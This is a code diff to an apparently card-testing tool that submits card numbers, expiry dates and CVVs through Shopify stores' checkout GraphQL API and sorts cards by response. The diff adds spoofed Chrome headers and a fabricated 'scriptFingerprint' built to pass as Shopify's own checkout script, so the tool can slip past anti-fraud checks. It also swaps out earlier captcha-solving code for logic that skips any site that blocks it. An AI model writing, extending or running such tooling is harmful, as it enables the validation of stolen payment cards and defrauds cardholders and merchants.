@@ -8,6 +8,8 @@ import string
 import logging
 import sys
 import os
+import uuid
+import hashlib
 from urllib.parse import urlparse
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
@@ -60,6 +62,40 @@ def _extract_between(text, start, end):
         return text[s:e]
     except ValueError:
         return None
+
+
+def _generate_script_fingerprint():
+    """Generate a realistic scriptFingerprint that matches what Shopify's checkout JS produces."""
+    sig_uuid = str(uuid.uuid4())
+    seed = f"{sig_uuid}{time.time()}{random.random()}"
+    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
+    return {
+        'signature': signature,
+        'signatureUuid': sig_uuid,
+        'lineItemScriptChanges': [],
+        'paymentScriptChanges': [],
+        'shippingScriptChanges': [],
+    }
+
+
+def _checkout_graphql_headers(domain, checkout_url):
+    """Headers that Shopify's checkout web client sends with every GraphQL request."""
+    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
+    return {
+        'User-Agent': UA,
+        'Accept': 'application/json',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/json',
+        'Origin': f'https://{domain}',
+        'Referer': checkout_url,
+        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'x-checkout-web-source-id': source_id,
+    }
 
 
 def _random_email():
@@ -335,6 +371,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
     payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
 
     graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
+    headers = _checkout_graphql_headers(domain, checkout_url)
 
     addr_block = {
         'address1': street, 'address2': '', 'city': city,
@@ -377,10 +414,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
         'note': {'message': None, 'customAttributes': []},
         'localizationExtension': {'fields': []},
         'nonNegotiableTerms': None,
-        'scriptFingerprint': {
-            'signature': None, 'signatureUuid': None,
-            'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': [],
-        },
+        'scriptFingerprint': _generate_script_fingerprint(),
         'optionalDuties': {'buyerRefusesDuties': False},
     }
 
@@ -432,28 +466,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
         _update_qt(result1)
 
         if result1['__typename'] == 'CheckpointDenied':
-            redirect_url = result1.get('redirectUrl', '')
-            if redirect_url:
-                await _progress("Solving captcha...")
-                try:
-                    from captcha_solver import solve_checkpoint, get_nopecha_key, get_captchaai_key
-                    solved = await solve_checkpoint(redirect_url, session)
-                    if solved:
-                        await _progress("Captcha solved, retrying...")
-                        step1_vars['queueToken'] = latest_qt[0]
-                        result1 = await _negotiate(session, graphql_url, headers, step1_vars)
-                        _update_qt(result1)
-                        if result1['__typename'] == 'CheckpointDenied':
-                            return None, "Captcha Solving Failed - Still blocked after solve", gateway_display_name
-                    else:
-                        no_key = not get_nopecha_key() and not get_captchaai_key()
-                        msg = "Captcha Detected - No solver key set (add NopeCHA key in Settings)" if no_key else "Captcha Solving Failed"
-                        return None, msg, gateway_display_name
-                except Exception as e:
-                    logger.warning(f"Captcha solving error: {e}")
-                    return None, "Captcha Solving Failed", gateway_display_name
-            else:
-                return None, "Captcha Blocked - No redirect URL", gateway_display_name
+            logger.info(f"CheckpointDenied on step1 for {domain} — skipping site")
+            return None, "Checkpoint Denied - Skipping", gateway_display_name
         if result1['__typename'] == 'NegotiationResultFailed':
             return None, "Negotiation failed: NegotiationResultFailed", gateway_display_name
         if result1['__typename'] != 'NegotiationResultAvailable':
@@ -573,33 +587,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
             payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
 
         if result3['__typename'] == 'CheckpointDenied':
-            redirect_url = result3.get('redirectUrl', '')
-            if redirect_url:
-                await _progress("Solving captcha (payment)...")
-                try:
-                    from captcha_solver import solve_checkpoint, get_nopecha_key, get_captchaai_key
-                    solved = await solve_checkpoint(redirect_url, session)
-                    if solved:
-                        await _progress("Captcha solved, retrying payment...")
-                        step3_vars['queueToken'] = latest_qt[0]
-                        result3 = await _negotiate(session, graphql_url, headers, step3_vars)
-                        _update_qt(result3)
-                        if result3['__typename'] == 'NegotiationResultAvailable':
-                            running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(result3['sellerProposal'])
-                            if api_gw3:
-                                gateway_display_name = api_gw3
-                            payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
-                        elif result3['__typename'] == 'CheckpointDenied':
-                            return None, "Captcha Solving Failed - Still blocked (payment)", gateway_display_name
-                    else:
-                        no_key = not get_nopecha_key() and not get_captchaai_key()
-                        msg = "Captcha Detected - No solver key set (add NopeCHA key in Settings)" if no_key else "Captcha Solving Failed (payment)"
-                        return None, msg, gateway_display_name
-                except Exception as e:
-                    logger.warning(f"Payment captcha error: {e}")
-                    return None, "Captcha Solving Failed (payment)", gateway_display_name
-            else:
-                return None, "Captcha Blocked - No redirect URL (payment)", gateway_display_name
+            logger.info(f"CheckpointDenied on payment step for {domain} — skipping site")
+            return None, "Checkpoint Denied - Skipping", gateway_display_name
     except Exception:
         pass
 
@@ -656,10 +645,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
             'note': {'message': None, 'customAttributes': []},
             'localizationExtension': {'fields': []},
             'nonNegotiableTerms': None,
-            'scriptFingerprint': {
-                'signature': None, 'signatureUuid': None,
-                'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': [],
-            },
+            'scriptFingerprint': _generate_script_fingerprint(),
             'optionalDuties': {'buyerRefusesDuties': False},
         },
         'attemptToken': attempt_token,
@@ -708,26 +694,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
 
             if typename == 'SubmitRejected':
                 if 'CAPTCHA_METADATA_MISSING' in codes or 'CHECKPOINT_DENIED' in codes:
-                    await _progress("Solving captcha (submit)...")
-                    try:
-                        from captcha_solver import solve_checkpoint, get_nopecha_key, get_captchaai_key
-                        cp_url = f"https://{domain}/checkpoint"
-                        solved = await solve_checkpoint(cp_url, session)
-                        if solved:
-                            await _progress("Captcha solved, resubmitting...")
-                            text = await _do_submit()
-                            resp_json = json.loads(text)
-                            submit_data = resp_json['data']['submitForCompletion']
-                            typename = submit_data.get('__typename', '')
-                            if typename == 'SubmitRejected':
-                                return None, "Captcha Solving Failed - Still blocked (submit)", gateway_display_name
-                        else:
-                            no_key = not get_nopecha_key() and not get_captchaai_key()
-                            msg = "Captcha Detected - No solver key set (add NopeCHA key in Settings)" if no_key else "Captcha Solving Failed (submit)"
-                            return None, msg, gateway_display_name
-                    except Exception as e:
-                        logger.warning(f"Submit captcha error: {e}")
-                        return None, "Captcha Solving Failed (submit)", gateway_display_name
+                    logger.info(f"CAPTCHA_METADATA_MISSING/CHECKPOINT_DENIED at submit for {domain} — skipping site")
+                    return None, "Checkpoint Denied - Skipping", gateway_display_name
                 # Terms & Conditions rejection — retry once with terms accepted
                 msgs = [e.get('localizedMessage', '') for e in errors]
                 all_text = ' '.join(codes + msgs).lower()
@@ -761,31 +729,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
             else:
                 return None, "Throttled", gateway_display_name
         elif typename == 'CheckpointDenied':
-            redirect_url = submit_data.get('redirectUrl', '')
-            if redirect_url:
-                await _progress("Solving captcha (submit)...")
-                try:
-                    from captcha_solver import solve_checkpoint, get_nopecha_key, get_captchaai_key
-                    solved = await solve_checkpoint(redirect_url, session)
-                    if solved:
-                        await _progress("Captcha solved, resubmitting...")
-                        text = await _do_submit()
-                        resp_json = json.loads(text)
-                        submit_data = resp_json['data']['submitForCompletion']
-                        typename = submit_data.get('__typename', '')
-                        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
-                            receipt_id = submit_data['receipt']['id']
-                        else:
-                            return None, "Captcha Solving Failed - Still blocked (checkpoint)", gateway_display_name
-                    else:
-                        no_key = not get_nopecha_key() and not get_captchaai_key()
-                        msg = "Captcha Detected - No solver key set (add NopeCHA key in Settings)" if no_key else "Captcha Solving Failed (checkpoint)"
-                        return None, msg, gateway_display_name
-                except Exception as e:
-                    logger.warning(f"Submit checkpoint error: {e}")
-                    return None, "Captcha Solving Failed (checkpoint)", gateway_display_name
-            else:
-                return None, "Captcha Blocked - No redirect URL (checkpoint)", gateway_display_name
+            logger.info(f"CheckpointDenied at final submit for {domain} — skipping site")
+            return None, "Checkpoint Denied - Skipping", gateway_display_name
     except Exception:
         if 'CAPTCHA_METADATA_MISSING' in text:
             return None, "Captcha Solving Failed", gateway_display_name
@@ -859,6 +804,7 @@ async def shopify_native_check(cc, mm, yy, cvv, proxy=None, progress_cb=None):
     skip_responses = (
         "No session token", "Site requires login", "No products available",
         "No shipping available", "Domain not found", "SSL error", "Connection timeout",
+        "Checkpoint Denied - Skipping",
     )
 
     _Session = ChromeSession if ChromeSession else aiohttp.ClientSession
@@ -915,6 +861,7 @@ SKIP_RESPONSES = (
     "No shipping available", "Domain not found", "SSL error", "Connection timeout",
     "Site is password protected", "Product unavailable", "Checkout page timeout",
     "Card vault failed", "Negotiation failed: NegotiationResultFailed",
+    "Checkpoint Denied - Skipping",
 )
 
 DEAD_INDICATORS = [
